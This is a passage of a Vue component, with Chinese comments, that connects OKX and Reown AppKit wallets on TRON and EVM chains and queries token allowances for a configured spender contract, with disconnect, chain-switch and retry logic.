     * 选择连接类型
     */
    async selectConnectionType() {
      const coin = this.selectedCoin
      const chainType = this.formData.Coin
      console.log('=== 选择连接类型调试信息 ===')
      console.log('selectedCoin:', coin)
      console.log('formData.Coin:', chainType)
      console.log('currentChainConfig:', this.currentChainConfig)
      console.log('coinTypes:', this.coinTypes)

      // 查找当前选择的币种类型配置
      const selectedCoinType = this.coinTypes.find(coinItem => coinItem.value === chainType)
      console.log('selectedCoinType:', selectedCoinType)
      console.log('chainConfigs:', this.chainConfigs)

      // 如果是波场链，使用OKX Universal Provider连接钱包
      if (chainType.includes('TRC')) {
        console.log('检测到TRC链，使用OKX Universal Provider连接')
        this.showWalletSelector = true
      } else {
        // 其他链使用@reown/appkit连接钱包
        console.log('检测到非TRC链，使用@reown/appkit连接')

        // 根据当前链配置确定网络参数
        let selectedNetwork = null
        if (this.currentChainConfig) {
          const chainId = this.currentChainConfig.chainId
          console.log('使用currentChainConfig，chainId:', chainId)
          if (chainId === 'eip155:1') {
            selectedNetwork = { id: 1, name: 'Ethereum' }
          } else if (chainId === 'eip155:56') {
            selectedNetwork = { id: 56, name: 'BSC' }
          }
        } else {
          console.log('currentChainConfig为空，使用fallback逻辑，chainType:', chainType)
          // 优先根据 coinTypes 的映射来判断
          const coinTypeItem = (this.coinTypes || []).find(c => c.value === chainType)
          if (coinTypeItem) {
            if (coinTypeItem.chainId === 'eip155:1') {
              selectedNetwork = { id: 1, name: 'Ethereum' }
            } else if (coinTypeItem.chainId === 'eip155:56') {
              selectedNetwork = { id: 56, name: 'BSC' }
            } else if (coinTypeItem.chainId && coinTypeItem.chainId.startsWith('tron:')) {
              console.warn('TRC20 代币不应在 appKit 分支处理，兜底使用以太坊')
              selectedNetwork = { id: 1, name: 'Ethereum' }
            }
            console.log('根据 coinTypes 推断网络:', coinTypeItem, selectedNetwork)
          } else {
            // 二级兜底：根据值模式判断
            if (chainType.includes('ERC20')) {
              selectedNetwork = { id: 1, name: 'Ethereum' }
            } else if (chainType.includes('BEP20')) {
              selectedNetwork = { id: 56, name: 'BSC' }
            } else {
              selectedNetwork = { id: 1, name: 'Ethereum' }
            }
            console.log('使用二级兜底网络:', selectedNetwork, 'chainType:', chainType)
          }
        }

        console.log('最终选择的网络配置1:', selectedNetwork, this.appKit)

        // 确保AppKit已初始化，传递正确的网络参数
        if (!this.appKit) {
          await this.initializeAppKit(selectedNetwork)
        }
        await this.openModal()
      }
    },

    /**
     * trx链选择钱包并连接
     */
    async selectWallet(walletId) {
      try {
        console.log('选择钱包:', walletId, '当前连接状态:', this.isConnected)

        // 如果当前已连接钱包，先强制断开
        if (this.isConnected || this.session || this.okxProvider?.isConnected) {
          console.log('检测到现有连接，先断开连接')
          await this.handleDisconnect()

          // 额外等待确保断开完成
          await new Promise(resolve => setTimeout(resolve, 1000))
        }

        this.selectedWalletType = walletId
        this.showWalletSelector = false

        // 根据选择的钱包类型进行连接
        const selectedWallet = this.availableWallets.find(w => w.id === walletId)

        if (selectedWallet) {
          await this.handleConnect() // 移动端连接
        }
      } catch (error) {
        console.error('选择钱包失败:', error)
        this.$message.error(`钱包连接失败: ${error.message}`)
        // 确保状态被重置
        this.resetWalletStatus()
      }
    },

    async initProvider() {
      try {
        this.okxProvider = await OKXUniversalProvider.init({
          dappMetaData: {
            name: 'ZRAOX',
            icon: window.location.origin + '/favicon.ico',
            url: window.location.origin,
          },
        })

        this.okxTronProvider = new OKXTronProvider(this.okxProvider)

        this.tronService = new TronService(this.okxProvider)
        console.log('TronService1', this.tronService)

        // 监听会话事件
        this.okxProvider.on('session_update', this.onSessionUpdate)
        this.okxProvider.on('session_delete', this.onSessionDelete)

        // 监听链切换和账户变化事件
        this.okxProvider.on('chainChanged', this.onOKXChainChanged)
        this.okxProvider.on('accountsChanged', this.onOKXAccountsChanged)
        this.okxProvider.on('disconnect', this.onOKXDisconnect)

        console.log('OKX Provider initialized successfully')
      } catch (error) {
        console.error('Failed to initialize OKX Provider:', error)
        throw error
      }
    },

    onSessionUpdate(session) {
      console.log('Session updated:', session)
      this.session = session
    },

    /**
     * 会话删除
     */
    onSessionDelete() {
      console.log('Session deleted')
      this.session = null
      this.resetWalletStatus()
    },

    /**
     * OKX链切换事件处理
     */
    onOKXChainChanged(chainInfo) {
      console.log('OKX链切换事件:', chainInfo)
      this.$message.info(`OKX钱包链已切换: ${chainInfo.chainId || chainInfo}`)

      // 执行完整的链切换状态重置
      // this.resetChainSwitchState()

      // 延迟检查授权状态
      setTimeout(() => {
        this.performAutomaticApprovalCheck()
      }, 2000)
    },

    /**
     * OKX账户变化事件处理
     */
    onOKXAccountsChanged(accounts) {
      console.log('OKX账户变化事件:', accounts)
      if (!accounts || accounts.length === 0) {
        this.$message.warning('OKX钱包账户已断开')
        this.resetWalletStatus()
      } else {
        this.$message.info('OKX钱包账户已切换')
        // 执行完整的链切换状态重置
        this.resetChainSwitchState()
        setTimeout(() => {
          this.performAutomaticApprovalCheck()
        }, 1000)
      }
    },

    /**
     * OKX断开连接事件处理
     */
    onOKXDisconnect() {
      console.log('OKX钱包已断开连接')
      this.$message.warning('OKX钱包连接已断开')
      this.resetWalletStatus()
    },

    /**
     * 连接钱包（移动端）
     */
    async handleConnect() {
      try {
        if (!this.currentChainConfig) {
          this.$message.error('請先選擇幣種和鏈')
          return
        }

        this.isConnecting = true

        const chainType = this.formData.Coin

        // 检查链类型，确保TRC链使用OKX Universal Provider
        if (!chainType || !chainType.includes('TRC')) {
          this.$message.error('handleConnect方法仅用于TRC链连接，其他链请使用@reown/appkit')
          this.isConnecting = false
          return
        }

        console.log('使用OKX Universal Provider连接TRC链')

        // 初始化provider
        if (!this.okxProvider) {
          await this.initProvider()
        }

        // 构建命名空间配置
        const namespaces = buildNamespaces(this.currentChainConfig.chainId)

        // 连接钱包
        this.session = await this.okxProvider.connect({
          namespaces,
          optionalNamespaces: {},
          sessionConfig: {
            redirect: 'none',
          },
        })

        if (this.session) {
          // 从session中提取账户信息
          const accounts = this.getAccountsFromSession()
          if (accounts.length > 0) {
            this.isConnected = true
            this.walletAddress = accounts[0].split(':')[2] // 提取地址部分
            this.currentChainId = this.currentChainConfig.chainId

            // 自动填写钱包地址到提币地址输入框
            this.formData.Address = this.walletAddress

            this.$message.success('钱包连接正常')

            // 连接成功后自动检查授权状态
            await this.performAutomaticApprovalCheck()
          } else {
            throw new Error('钱包未连接')
          }
        } else {
          throw new Error('connection_failed')
        }
      } catch (error) {
        console.error('连接钱包失败:', error)
        this.$message.error(`connection_failed: ${error.message}`)
      } finally {
        this.isConnecting = false
      }
    },

    /**
     * 从session中提取账户信息
     */
    getAccountsFromSession() {
      if (!this.session || !this.session.namespaces) {
        return []
      }

      const chainId = this.currentChainConfig.chainId

      if (chainId.startsWith('eip155:')) {
        return this.session.namespaces.eip155?.accounts || []
      } else if (chainId.startsWith('tron:')) {
        return this.session.namespaces.tron?.accounts || []
      }

      return []
    },

    /**
     * 重置授权状态, 统一的授权状态重置方法
     */
    resetApprovalStatus() {
      this.allowanceAmount = '0'
      this.isApproved = false
      this.isApproving = false
      this.isRefreshingStatus = false

      console.log('授权状态已重置')
    },

    /**
     * 完整的链切换状态重置
     * 在链切换时调用，重置所有相关状态
     */
    resetChainSwitchState() {
      console.log('执行链切换状态重置')

      // 重置授权状态
      this.resetApprovalStatus()

      // 重置交易相关状态
      // this.isTransferring = false
      // this.transferProgress.show = false
      // this.transferError.show = false

      // 清除余额信息
      this.usdtBalance = '0'

      // 重置表单验证状态
      // if (this.$refs.transferForm) {
      //   this.$refs.transferForm.clearValidate()
      // }

      // 强制更新UI
      this.$forceUpdate()

      console.log('链切换状态重置完成')
    },

    /**
     * 更新授权状态
     * 统一的授权状态更新方法
     * @param {boolean} isApproved - 是否已授权
     * @param {string} allowanceAmount - 授权额度
     */
    updateApprovalStatus(isApproved, allowanceAmount = '0') {
      this.isApproved = isApproved
      this.allowanceAmount = allowanceAmount
      console.log('授权状态已更新:', {
        isApproved: this.isApproved,
        allowanceAmount: this.allowanceAmount,
      })
    },

    /**
     * 钱包连接后自动执行授权检查
     * 统一的授权检查入口，包含错误处理和用户提示
     */
    async performAutomaticApprovalCheck() {
      try {
        console.log('开始自动授权检查流程')

        // 检查基本连接条件
        if (!this.isConnected || !this.walletAddress) {
          console.log('钱包未正确连接，跳过授权检查')
          return
        }

        // 检查是否有合约配置
        if (!this.currentTokenConfig || !this.currentChainConfig) {
          console.log('缺少代币或链配置，跳过授权检查')
          return
        }

        // 根据链类型检查相应的provider是否可用
        const chainId = this.currentChainConfig.chainId
        if (chainId.startsWith('tron:') && !this.okxProvider) {
          console.log('TRON链钱包未连接，跳过授权检查')
          return
        }
        if (!chainId.startsWith('tron:') && !this.appKit) {
          console.log('EVM链钱包未连接，跳过授权检查')
          return
        }

        // 显示检查状态
        this.$message.info('正在检查合约授权状态...')

        // 执行授权检查
        await this.checkApprovalStatus()

        // 根据检查结果提供用户反馈
        if (this.isApproved) {
          console.log('授权检查完成：已授权', { allowanceAmount: this.allowanceAmount })
          // this.$message.success(`合约已授权，额度：${this.allowanceAmount}`)
        } else {
          console.log('授权检查完成：未授权')
          // this.$message.warning('合约未授权，请点击授权按钮进行授权')
        }
      } catch (error) {
        console.error('自动授权检查失败:', error)
        // this.$message.error(`授权检查失败: ${error.message}`)
        this.resetApprovalStatus()
      }
    },

    /**
     * 检查代币授权状态
     * 核心授权检查逻辑，不包含UI提示
     */
    async checkApprovalStatus() {
      console.log('开始检查授权')
      try {
        // 检查必要条件
        if (!this.currentTokenConfig) {
          this.resetApprovalStatus()
          return
        }

        if (!this.walletAddress) {
          this.resetApprovalStatus()
          return
        }

        // 获取合约地址
        const chainName = this.currentChainConfig.name
        const spenderAddress = contractAddress[chainName]

        if (!spenderAddress) {
          this.resetApprovalStatus()
          return
        }

        console.log('授权检查参数:', {
          chainName,
          tokenContract: this.currentTokenConfig.contractAddress,
          spenderAddress,
          walletAddress: this.walletAddress,
        })

        const chainId = this.currentChainConfig.chainId

        // 根据链类型选择查询方式：TRON链使用checkTronApproval，其他情况使用appKit查询
        if (chainId.startsWith('tron:')) {
          // TRON链：使用checkTronApproval查询授权
          if (!this.okxProvider) {
            this.resetApprovalStatus()
            return
          }
          await this.checkTronApproval(spenderAddress)
        } else {
          // 其他链（主要是EVM链）：使用appKit查询授权
          if (!this.appKit) {
            this.resetApprovalStatus()
            return
          }
          await this.checkAppKitApproval(spenderAddress)
        }
      } catch (error) {
        console.error('检查授权状态失败:', error)
        this.$message.error(`检查授权失败: ${error.message}`)
        this.resetApprovalStatus()
      }
    },

    /**
     * 检查TRON链的授权状态
     * @param spenderAddress {string} 授权地址
     */
    async checkTronApproval(spenderAddress) {
      try {
        if (!this.currentTokenConfig?.contractAddress) {
          this.updateApprovalStatus(true, 'unlimited')
          return
        }

        // 查询授权额度
        const result = await this.getTronAllowance(this.currentTokenConfig.contractAddress, spenderAddress)

        if (result.success) {
          const allowanceAmount = result.allowance || '0'

          // 检查授权额度是否足够
          const allowanceNum = parseFloat(allowanceAmount)
          const isApproved = allowanceNum > 0

          // 使用统一的状态更新方法
          this.updateApprovalStatus(isApproved, allowanceAmount)

          console.log('TRON授权状态检查完成:', {
            allowanceAmount,
            isApproved,
            allowanceNum,
          })
        } else {
          this.updateApprovalStatus(false, '0')
          throw new Error(result.error || 'TRON授权查询失败')
        }
      } catch (error) {
        this.updateApprovalStatus(false, '0')
        throw error
      }
    },

    /**
     * 使用 TronWeb 查询 TRON 代币授权额度
     */
    async getTronAllowance(tokenAddress, spenderAddress) {
      try {
        if (!this.okxProvider || !this.session) {
          throw new Error('The wallet is not connected, please connect the wallet first')
        }

        if (!tokenAddress || !spenderAddress) {
          throw new Error('Missing necessary contract address parameters')
        }

        // 检查插件是否可用
        if (!this.createTronWeb) {
          throw new Error('The TronWeb plugin is not loading correctly, please refresh the page and try again')
        }

        // 使用插件创建 TronWeb 实例
        const tronWeb = await this.createTronWeb()

        // 验证地址格式
        if (!tronWeb.isAddress(this.walletAddress)) {
          throw new Error('Invalid wallet address format')
        }
        if (!tronWeb.isAddress(spenderAddress)) {
          throw new Error('Invalid authorization address format')
        }
        if (!tronWeb.isAddress(tokenAddress)) {
          throw new Error('Invalid contract address format')
        }

        console.log('tron地址格式验证通过')

        // 使用 TronWeb 的 triggerConstantContract 方法（根据官方文档）
        const functionSelector = 'allowance(address,address)'
        const parameter = [
          { type: 'address', value: this.walletAddress },
          { type: 'address', value: spenderAddress },
        ]

        const result = await tronWeb.transactionBuilder.triggerConstantContract(
          tokenAddress,
          functionSelector,
          { feeLimit: 100000000 },
          parameter,
          this.walletAddress,
        )

        if (!result || !result.constant_result || result.constant_result.length === 0) {
          throw new Error('Query result is empty')
        }

        // 解析返回的十六进制结果
        const hexResult = result.constant_result[0]
        const allowance = tronWeb.BigNumber('0x' + hexResult)

        // 转换为可读格式 (根据代币精度，USDT 有 6 位小数)
        const decimals = this.currentTokenConfig?.decimals || 6
        let allowanceFormatted
        if (typeof allowance === 'object' && allowance.toString) {
          // 处理 BigNumber 类型
          allowanceFormatted = allowance.toString() / Math.pow(10, decimals)
        } else {
          allowanceFormatted = allowance / Math.pow(10, decimals)
        }

        console.log('格式化授权额度:', allowanceFormatted)

        return {
          success: true,
          allowance: allowanceFormatted.toString(),
        }
      } catch (error) {
        // 提供更友好的错误信息
        let errorMessage = 'Failed to query the authorization limit'
        if (error.message.includes('User rejected')) {
          errorMessage = 'The user canceled the operation'
        } else if (error.message.includes('network')) {
          errorMessage = 'Network connection is wrong, please check the network'
        } else if (error.message.includes('contract')) {
          errorMessage = 'The contract call failed, please check the contract address'
        } else if (error.message.includes('Invalid address')) {
          errorMessage = 'Invalid contract address format'
        } else if (error.message.includes('owner_address')) {
          errorMessage = 'TRON Address parameter error'
        }

        return {
          success: false,
          error: errorMessage,
        }
      }
    },

    loadTronWebFromCDN() {
      return new Promise((resolve, reject) => {
        // 检查是否已经加载
        if (window.TronWeb) {
          console.log('TronWeb 已存在于 window 对象中')
          resolve(window.TronWeb)
          return
        }

        console.log('开始从 CDN 加载 TronWeb...')

        // 创建 script 标签加载 TronWeb
        const script = document.createElement('script')
        script.src = 'https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js'
        script.onload = () => {
          console.log('TronWeb CDN 脚本加载完成')
          // 等待一小段时间确保 TronWeb 完全初始化
          setTimeout(() => {
            if (window.TronWeb) {
              console.log('TronWeb 成功加载到 window 对象')
              resolve(window.TronWeb)
            } else {
              console.error('TronWeb 脚本加载完成但 window.TronWeb 不存在')
              reject(new Error('TronWeb 加载失败：window.TronWeb 不存在'))
            }
          }, 100)
        }
        script.onerror = error => {
          console.error('TronWeb CDN 加载失败:', error)
          reject(new Error('无法从 CDN 加载 TronWeb，请检查网络连接'))
        }
        document.head.appendChild(script)
      })
    },

    async createTronWeb() {
      // 确保只在客户端执行
      console.log('createTronWeb 函数被调用')

      try {
        console.log('开始加载 TronWeb...')
        const TronWeb = await this.loadTronWebFromCDN()
        console.log('TronWeb 类加载成功，开始创建实例')
        console.log('TronWeb 对象结构:', TronWeb)
        console.log('TronWeb 类型:', typeof TronWeb)
        console.log('TronWeb 是否为函数:', typeof TronWeb === 'function')

        // 检查 TronWeb 的正确构造方式
        let TronWebConstructor = TronWeb
        if (TronWeb.TronWeb && typeof TronWeb.TronWeb === 'function') {
          console.log('使用 TronWeb.TronWeb 作为构造函数')
          TronWebConstructor = TronWeb.TronWeb
        } else if (TronWeb.default && typeof TronWeb.default === 'function') {
          console.log('使用 TronWeb.default 作为构造函数')
          TronWebConstructor = TronWeb.default
        }

        const tronWeb = new TronWebConstructor({
          fullHost: 'https://api.trongrid.io',
        })

        console.log('TronWeb 实例创建成功:', tronWeb)
        return tronWeb
      } catch (error) {
        console.error('createTronWeb 失败:', error)
        throw new Error(`TronWeb 加载失败: ${error.message}`)
      }
    },

    /**
     * 使用appKit查询授权状态（适用于EVM链等）
     */
    async checkAppKitApproval(spenderAddress) {
      try {
        if (!this.currentTokenConfig?.contractAddress) {
          this.updateApprovalStatus(true, 'unlimited')
          return
        }

        // 使用appKit的provider查询授权额度
        const walletProvider = this.appKit.getWalletProvider()
        if (!walletProvider) {
          throw new Error('Unable to get wallet provider from AppKit')
        }

        // 编码allowance查询调用
        const data = encodeAllowanceCall(this.walletAddress, spenderAddress)

        // 通过appKit查询授权额度
        const result = await walletProvider.request({
          method: 'eth_call',
          params: [
            {
              to: this.currentTokenConfig.contractAddress,
              data: data,
            },
            'latest',
          ],
        })

        if (!result || result === '0x') {
          this.updateApprovalStatus(false, '0')
          return
        }

        // 解析返回结果 - 考虑代币精度
        const allowanceWei = BigInt(result)
        const decimals = this.currentTokenConfig.decimals || 18
        const divisor = BigInt(10 ** decimals)

        // 转换为可读格式
        const allowanceFormatted = (Number(allowanceWei) / Number(divisor)).toString()

        // 检查是否有足够的授权额度（大于0.01）
        const minRequiredAllowance = 0.01
        const isApproved = parseFloat(allowanceFormatted) > minRequiredAllowance

        // 使用统一的状态更新方法
        this.updateApprovalStatus(isApproved, allowanceFormatted)

        console.log('AppKit授权状态检查完成:', {
          allowanceWei: allowanceWei.toString(),
          allowanceFormatted,
          isApproved,
          minRequired: minRequiredAllowance,
        })
      } catch (error) {
        console.error('AppKit授权查询失败:', error)
        this.updateApprovalStatus(false, '0')
        throw error
      }
    },

    /**
     * 断开钱包连接
     */
    async handleDisconnect() {
      try {
        console.log('开始断开钱包连接，当前钱包类型:', this.selectedWalletType)

        const chainType = this.formData.Coin
        const disconnectPromises = []

        // 根据链类型选择断开方式
        if (chainType && chainType.includes('TRC')) {
          console.log('断开TRC链连接 - 使用OKX Universal Provider')

          // 断开session连接
          if (this.session) {
            try {
              console.log('断开session连接')
              disconnectPromises.push(this.session.disconnect())
            } catch (error) {
              console.warn('断开session失败:', error)
            }
          }

          // 断开OKX Provider连接
          if (this.okxProvider) {
            try {
              console.log('断开OKX Provider连接，当前连接状态:', this.okxProvider.isConnected)
              if (this.okxProvider.isConnected) {
                disconnectPromises.push(this.okxProvider.disconnect())
              }
            } catch (error) {
              console.warn('断开OKX Provider失败:', error)
            }
          }

          // 断开TRON Provider连接
          if (this.okxTronProvider) {
            try {
              console.log('清理TRON Provider连接')
              this.okxTronProvider = null
            } catch (error) {
              console.warn('清理TRON Provider失败:', error)
            }
          }
        } else {
          console.log('断开非TRC链连接 - 使用@reown/appkit')

          // 断开AppKit连接
          if (this.appKit) {
            try {
              console.log('断开AppKit连接')
              disconnectPromises.push(this.appKit.disconnect())
            } catch (error) {
              console.warn('断开AppKit失败:', error)
            }
          }
        }

        // 等待所有断开操作完成
        if (disconnectPromises.length > 0) {
          await Promise.allSettled(disconnectPromises)
        }

        // 强制等待一段时间确保断开完成
        await new Promise(resolve => setTimeout(resolve, 500))

        // 清空所有连接相关的引用
        this.session = null
        this.okxProvider = null
        this.okxTronProvider = null

        // 重置钱包状态
        this.resetWalletStatus()

        console.log('钱包连接已完全断开')
      } catch (error) {
        console.error('断开钱包失败:', error)
        // 即使断开失败也强制重置状态
        this.session = null
        this.okxProvider = null
        this.okxTronProvider = null
        this.resetWalletStatus()
        this.$message.warning('钱包断开可能不完整，状态已重置')
      }
    },

    /**
     * 初始化formData.Coin
     */
    initFormDataCoin() {
      if (this.selectedCoin === 'USDT') {
        this.formData.Coin = 'USDT' // 默认选择ERC20
      } else if (this.selectedCoin === 'USDC') {
        this.formData.Coin = 'USDC' // 默认选择ERC20
      } else {
        // 对于其他币种，使用币种名称
        this.formData.Coin = this.selectedCoin
      }
    },

    /**
     * 选择币种
     * @param coinName
     */
    async getSelectedCoinName(coinName) {
      // this.active_currency = null;
      if (coinName === 'BNB') {
        this.selectedCoin = 'BSC'
      } else {
        this.selectedCoin = coinName
      }

      // 使用统一的初始化方法
      this.initFormDataCoin()
      this.$emit('getSelectedCoin', this.selectedCoin) // let selectChains;

      // 重置钱包和授权状态
      this.isConnected = false
      this.walletAddress = ''
      this.isApproved = false
      this.allowanceAmount = '0'

      await this.handleDisconnect()

      if (this.selectedCoin === 'BSC') {
        this.selectedCoin = 'BNB'
      }
    },

    /**
     * 处理网络变化（appKit内部网络切换）
     * @param {string} previousChainId - 之前的链ID
     * @param {string} newChainId - 新的链ID
     */
    async handleNetworkChange(previousChainId, newChainId) {
      try {
        console.log('处理网络变化:', { previousChainId, newChainId })

        // 显示网络切换提示
        // this.$message.info(`网络已切换: ${this.getChainName(newChainId)}`)

        // 执行完整的链切换状态重置
        // this.resetChainSwitchState()

        // 更新当前链配置
        this.updateChainConfig(newChainId)

        // 延迟检查授权状态，给网络切换一些时间
        setTimeout(() => {
          this.performAutomaticApprovalCheck()
        }, 1000)
      } catch (error) {
        console.error('网络变化处理失败:', error)
        this.$message.error('网络切换处理失败，请刷新页面重试')
      }
    },

    /**
     * 更新链配置
     * @param {string} chainId - 新的链ID
     */
    updateChainConfig(chainId) {
      // 不要直接覆盖computed的currentChainConfig，避免状态不同步
      // 改为仅记录当前链ID并打印日志
      console.log('接收到新的链ID:', chainId)
      this.currentChainId = typeof chainId === 'number' ? chainId : String(chainId)
    },

    /**
     * 链切换事件（用户主动切换）
     * @description 如果从evm系列切换到tron链， 或者tron链切换到其他链， 需要断开连接，否则通过appKit切换当前连接的链
     */
    async onChangeChain() {
      try {
        console.log('链切换事件触发，当前连接状态:', this.isConnected)
        console.log('切换前的currentChainConfig:', this.currentChainConfig)

        // 重置授权状态
        this.resetApprovalStatus()
        
        // 重要：清除旧的链配置，让系统根据新选择的币种重新计算
        // 这样currentChainConfig计算属性会根据新的formData.Coin重新计算
        // 不需要手动设置，因为currentChainConfig是计算属性
        console.log('切换后将重新计算currentChainConfig')

        // 如果当前已连接钱包，需要断开并重新连接
        if (this.isConnected) {
          console.log('检测到钱包已连接，执行断开重连流程')
          await this.handleDisconnect()

          // 等待断开完成
          await new Promise(resolve => setTimeout(resolve, 800))

          // 提示用户需要重新连接
          // this.$message.info('网络已切换，请重新连接钱包')
        } else {
          console.log('当前无钱包连接，仅重置状态')
        }
        
        // 强制触发currentChainConfig的重新计算
        this.$nextTick(() => {
          console.log('链切换完成，新的currentChainConfig:', this.currentChainConfig)
        })
      } catch (error) {
        console.error('链切换处理失败:', error)
        // 确保状态被重置
        this.resetWalletStatus()
        this.$message.warning('网络切换时出现问题，请重新连接钱包')
      }
    },

    /**
     * 增强的授权状态检查（带重试机制和详细状态跟踪）
     */
    async checkApprovalStatusWithRetry(maxRetries = 3) {
      let lastError = null
      let retryReasons = []
      let totalDuration = 0
      const startTime = Date.now()

      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          await this.checkApprovalStatus()

          // 检查成功，返回结果
          totalDuration = Date.now() - startTime
          return {
            success: true,
            isApproved: this.isApproved,
            allowanceAmount: this.allowanceAmount,
            attempt: attempt,
            duration: totalDuration,
            chain: this.selectedChain,
          }
        } catch (error) {
          lastError = error

          // 分析错误类型并记录重试原因
          let errorType = 'unknown'
          let retryReason = ''

          if (error.message?.includes('network') || error.message?.includes('timeout') || error.message?.includes('fetch')) {
            errorType = 'network'
            retryReason = this.$t('wallet.network_connection_issue')
          } else if (
            error.message?.includes('contract') ||
            error.message?.includes('call') ||
            error.message?.includes('revert')
          ) {
            errorType = 'contract'
            retryReason = this.$t('wallet.contract_call_failed')
          } else if (
            error.message?.includes('provider') ||
            error.message?.includes('wallet') ||
            error.message?.includes('connection')
          ) {
            errorType = 'provider'
            retryReason = this.$t('wallet.wallet_connection_issue')
          } else if (error.message?.includes('insufficient') || error.message?.includes('balance')) {
            errorType = 'balance'
            retryReason = this.$t('wallet.insufficient_balance')
          } else if (error.message?.includes('gas') || error.message?.includes('fee')) {
            errorType = 'gas'
            retryReason = this.$t('wallet.gas_fee_issue')
          } else {
            retryReason = this.$t('wallet.unknown_error_details', {
              details: error.message?.substring(0, 50) || this.$t('wallet.no_details'),
            })
          }

          retryReasons.push({
            attempt,
            errorType,
            reason: retryReason,
            timestamp: new Date().toLocaleTimeString(),
          })

          // 如果不是最后一次尝试，等待后重试
          if (attempt < maxRetries) {
            const waitTime = attempt * 1500 // 递增等待时间，稍微增加间隔
            await new Promise(resolve => setTimeout(resolve, waitTime))
          }
        }
      }

      // 所有尝试都失败了
      totalDuration = Date.now() - startTime
      console.error(this.$t('wallet.approval_status_check_all_attempts_failed'), {
        error: lastError,
        retryReasons,
        totalDuration,
        chain: this.selectedChain,
      })

      return {
        success: false,
        error: lastError?.message || this.$t('wallet.approval_status_check_failed'),
        attempts: maxRetries,
        retryReasons,
        duration: totalDuration,
        chain: this.selectedChain,
        lastErrorType: retryReasons[retryReasons.length - 1]?.errorType || 'unknown',
      }
    },
  },
}
</script>

<style>
.wallet-icon {
  width: 50px;
}
</style>
